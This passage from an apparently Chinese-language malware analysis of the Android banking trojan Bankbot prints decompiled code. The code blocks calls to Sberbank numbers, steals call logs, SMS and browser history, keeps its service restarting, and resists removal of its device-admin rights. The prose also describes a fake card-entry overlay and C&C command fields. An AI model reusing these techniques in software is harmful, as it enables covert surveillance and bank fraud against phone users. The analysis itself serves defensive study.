class="hljs-string">&quot;incoming_number&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v5</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v11</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">v9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(action.equals(<span class="hljs-string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> v5.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<br>                <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">if</span>(v1 != <span class="hljs-literal">null</span>) &#123;<br>            v8 = v1.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>);<br>            <span class="hljs-keyword">if</span>(v8.length &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">int</span> v13;<br>                <span class="hljs-keyword">for</span>(v13 = <span class="hljs-number">0</span>; v13 &lt; v8.length; ++v13) &#123;<br>                    <span class="hljs-keyword">if</span>(v4.contains(v8[v13])) &#123;<br>                        v9 = <span class="hljs-number">1</span>;<br>                        v11 = String.valueOf(v11) + <span class="hljs-string">&quot;blocked outgoing call&quot;</span>;<br>                        <span class="hljs-built_in">this</span>.setResultData(<span class="hljs-literal">null</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(v9 == <span class="hljs-number">0</span>) &#123;<br>            v11 = String.valueOf(v11) + <span class="hljs-string">&quot;outgoing call&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportWithDataTask</span>(context, <span class="hljs-string">&quot;call_data&quot;</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-built_in">this</span>.toJSON(v4, <br>                v11) + <span class="hljs-string">&quot;]&quot;</span>&#125;);<br>    &#125;<br>  ...<br> &#125;<br></code></pre></td></tr></table></figure><p>通过网页 <a href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> 中的信息我们可以知道：</p><p>8005555550 4955005550 这两个号码 sberbank 的号码，在俄罗斯拨打免费。</p><h3 id="禁止接听指定号码电话"><a href="#禁止接听指定号码电话" class="headerlink" title="禁止接听指定号码电话"></a>禁止接听指定号码电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;8005555550; 4955005550;&quot;</span>;<br><br><span class="hljs-keyword">if</span>((action.equals(<span class="hljs-string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="hljs-string">&quot;RINGING&quot;</span>))) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> v3 != <span class="hljs-literal">null</span> ? v3.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>).replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>).replace(<br>        <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>) : <span class="hljs-string">&quot;Unknown&quot;</span>;<br><span class="hljs-keyword">if</span>(v10 != <span class="hljs-literal">null</span>) &#123;<br>    v8 = v10.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>);<br>    <span class="hljs-keyword">for</span>(v13 = <span class="hljs-number">0</span>; v13 &lt; v8.length; ++v13) &#123;<br>        <span class="hljs-keyword">if</span>(v2.contains(v8[v13])) &#123;<br>            v11 = <span class="hljs-string">&quot;blocked incoming call&quot;</span>;<br>            v9 = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">this</span>.hangUp(context);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!v2.contains(<span class="hljs-string">&quot;Unknown&quot;</span>)) &#123;<br>        goto label_106;<br>    &#125;<br><br>    v11 = <span class="hljs-string">&quot;blocked incoming call&quot;</span>;<br>    v9 = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">this</span>.hangUp(context);<br>&#125;<br><br>label_106:<br><span class="hljs-keyword">if</span>(v9 == <span class="hljs-number">0</span>) &#123;<br>    v11 = <span class="hljs-string">&quot;incoming call&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ReportWithDataTask</span>(context, <span class="hljs-string">&quot;call_data&quot;</span>).execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-built_in">this</span>.toJSON(v2, <br>        v11) + <span class="hljs-string">&quot;]&quot;</span>&#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="隐私窃取"><a href="#隐私窃取" class="headerlink" title="隐私窃取"></a>隐私窃取</h3><h4 id="获取电话拨打记录"><a href="#获取电话拨打记录" class="headerlink" title="获取电话拨打记录"></a>获取电话拨打记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getCallLog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v20</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v18</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;O||U|T||||G|O|||I|N||G|&quot;</span>.replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(CallLog$Calls.CONTENT_URI, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <br>            <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v15</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;I++N+C+O+++M+I++N+G+&quot;</span>.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v16</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;M-I--S--S---E--D---&quot;</span>.replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">v22</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;***&#123;\&quot;n*u**mb**e*r\&quot;***:%s,\&quot;da****te\&quot;:%s,\&quot;d*u*ra****ti*o***n\&quot;:%s,\&quot;t*yp***e\&quot;:%s&#125;*&quot;</span><br>            .replace(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">if</span>((v10.moveToFirst()) &amp;&amp; v10.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v17</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;number&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v21</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;type&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v11</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;date&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v14</span> <span class="hljs-operator">=</span> v10.getColumnIndex(<span class="hljs-string">&quot;duration&quot;</span>);<br>        <span class="hljs-keyword">while</span>(!v10.isAfterLast()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v19</span> <span class="hljs-operator">=</span> v10.getString(v17);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v9</span> <span class="hljs-operator">=</span> v10.getString(v21);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> v10.getString(v11);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> v10.getString(v14);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">v13</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">switch</span>(Integer.parseInt(v9)) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: &#123;<br>                    v13 = v15;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: &#123;<br>                    v13 = v18;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: &#123;<br>                    v13 = v16;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br>            v20.append(String.format(Locale.US, v22, JSONObject.quote(v19), JSONObject.quote(<br>                    v7), JSONObject.quote(v8), JSONObject.quote(v13)));<br>            <span class="hljs-keyword">if</span>(!v10.isLast()) &#123;<br>                v20.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v10.moveToNext();<br>        &#125;<br><br>        v10.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v20.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="获取短信记录"><a href="#获取短信记录" class="headerlink" title="获取短信记录"></a>获取短信记录</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getSmsLog</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v10</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(Uri.parse(<span class="hljs-string">&quot;content://ABC&quot;</span>.replace(<span class="hljs-string">&quot;A&quot;</span>, <br>            <span class="hljs-string">&quot;s&quot;</span>).replace(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;m&quot;</span>).replace(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>)), <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span>((v8.moveToFirst()) &amp;&amp; v8.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">while</span>(!v8.isAfterLast()) &#123;<br>            v10.append(String.format(Locale.US, <span class="hljs-string">&quot;&#123;\&quot;address\&quot;:%s,\&quot;body\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, <br>                    JSONObject.quote(v8.getString(v8.getColumnIndex(<span class="hljs-string">&quot;address&quot;</span>))), JSONObject<br>                    .quote(v8.getString(v8.getColumnIndex(<span class="hljs-string">&quot;body&quot;</span>))), JSONObject.quote(v8.getString(<br>                    v8.getColumnIndex(<span class="hljs-string">&quot;date&quot;</span>)))));<br>            <span class="hljs-keyword">if</span>(!v8.isLast()) &#123;<br>                v10.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v8.moveToNext();<br>        &#125;<br><br>        v8.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v10.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="浏览器书签"><a href="#浏览器书签" class="headerlink" title="浏览器书签"></a>浏览器书签</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> StringBuilder <span class="hljs-title function_">getHistory</span><span class="hljs-params">(Uri historyUri)</span> &#123;<br>    <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">v8</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-type">Cursor</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.context.getContentResolver().query(historyUri, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;title&quot;</span>, <span class="hljs-string">&quot;url&quot;</span>, <br>            <span class="hljs-string">&quot;date&quot;</span>&#125;, <span class="hljs-string">&quot;bookmark = 0&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span>((v6.moveToFirst()) &amp;&amp; v6.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">while</span>(!v6.isAfterLast()) &#123;<br>            v8.append(String.format(Locale.US, <span class="hljs-string">&quot;&#123;\&quot;title\&quot;:%s,\&quot;url\&quot;:%s,\&quot;date\&quot;:%s&#125;&quot;</span>, JSONObject<br>                    .quote(v6.getString(v6.getColumnIndex(<span class="hljs-string">&quot;title&quot;</span>))), JSONObject.quote(v6.getString(<br>                    v6.getColumnIndex(<span class="hljs-string">&quot;url&quot;</span>))), JSONObject.quote(v6.getString(v6.getColumnIndex(<br>                    <span class="hljs-string">&quot;date&quot;</span>)))));<br>            <span class="hljs-keyword">if</span>(!v6.isLast()) &#123;<br>                v8.append(<span class="hljs-string">&quot;,&quot;</span>);<br>            &#125;<br><br>            v6.moveToNext();<br>        &#125;<br><br>        v6.close();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> v8.append(<span class="hljs-string">&quot;]&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="骗取信用卡信息"><a href="#骗取信用卡信息" class="headerlink" title="骗取信用卡信息"></a>骗取信用卡信息</h2><p>当用户打开Google Play 应用时，打开伪造的Activity，诱使用户输入信用卡信息。</p><h2 id="高级技术"><a href="#高级技术" class="headerlink" title="高级技术"></a>高级技术</h2><h3 id="不断重启的Servcie"><a href="#不断重启的Servcie" class="headerlink" title="不断重启的Servcie"></a>不断重启的Servcie</h3><p>com.android.smali3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>.onDestroy();<br>    <span class="hljs-built_in">this</span>.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.getApplicationContext(), smali3.class));<br>&#125;<br></code></pre></td></tr></table></figure><p>服务被停止，立即重启，无法停止。</p><h3 id="防止卸载"><a href="#防止卸载" class="headerlink" title="防止卸载"></a>防止卸载</h3><p>Bankbot 申请 Device Admin 权限，无法被正常卸载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; adb shell pm uninstall com.android.market<br>Failure<br><br></code></pre></td></tr></table></figure><h3 id="禁止删除-Device-Admin-权限"><a href="#禁止删除-Device-Admin-权限" class="headerlink" title="禁止删除 Device Admin 权限"></a>禁止删除 Device Admin 权限</h3><p>这个一个非常流氓的做法，具体的做法是如下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdRec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DeviceAdminReceiver</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AdRec</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> CharSequence <span class="hljs-title function_">onDisableRequested</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AppCrash</span>().Register(context);<br>        <span class="hljs-keyword">if</span>(Build$VERSION.SDK_INT &lt;= <span class="hljs-number">0xA</span>) &#123;<br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.settings.SETTINGS&quot;</span>);<br>            v2.setFlags(<span class="hljs-number">0x50000000</span>);<br>            context.startActivity(v2);<br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span>);<br>            v4.addCategory(<span class="hljs-string">&quot;android.intent.category.HOME&quot;</span>);<br>            v4.setFlags(<span class="hljs-number">0x10000000</span>);<br>            context.startActivity(v4);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;<br>        &#125;<br><br>        context.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(context, ASec.class));<br>        <span class="hljs-type">long</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x7D0</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(v6);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(InterruptedException v3) &#123;<br>            v3.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;WARNING! Your device will now reboot to factory settings.\n\nClick \&quot;Yes\&quot; to erase your data and continue. \&quot;No\&quot; for cancel.&quot;</span>;<br>    &#125;<br><br>   ...<br>&#125;<br></code></pre></td></tr></table></figure><p>重写 DeviceAdminReceiver 的 onDisableRequest 方法。使用 Thread.sleep 方法使用户<br>无法操作界面，在此期间采取 Activity 切换的方法绕开取消激活的步骤。</p><p>这里出过几个问题，</p><ol><li>Backdoor.AndroidOS.Obad.a 使用的，在设备管理器中隐身</li><li>就是现在代码中所用到这个，目前在所有的Android 版本中存在。</li></ol><h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>通过界面劫持，诱使用户将App设置为设备管理器。从下图中可以看见Continues按钮其实<br>是设备管理器的激活按钮。</p><h2 id="使用翠鸟对恶意样本进行检查的结果"><a href="#使用翠鸟对恶意样本进行检查的结果" class="headerlink" title="使用翠鸟对恶意样本进行检查的结果"></a>使用翠鸟对恶意样本进行检查的结果</h2><h2 id="0x02-C-C-协议分析"><a href="#0x02-C-C-协议分析" class="headerlink" title="0x02 C&amp;C 协议分析"></a>0x02 C&amp;C 协议分析</h2><p>Bankbot 以固定时间轮询的方式向C&amp;C服务器请求命令，命令的格式为json格式。从代码中<br>可以得到json字段的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_ACTION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;action&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_CALL_LOG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;call_log&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_DATA</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;data&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_HISTORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;browser_history&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;id&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_IMEI</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;imei&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_INTERCEPT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;intercept&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_MAYHEM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mayhem&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_MESSAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prefix_1&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_NEW_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_NUMBER_SEND_TO</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;number_1&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_OPERATOR</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;op&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_PHONE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;phone&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_POLL_INTERVAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server_poll&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prefix&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_REPORT_CALLS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calls&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_SMS_HISTORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sms_history&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_SPAM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;text_2&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FIELD_STATUS</span> <span 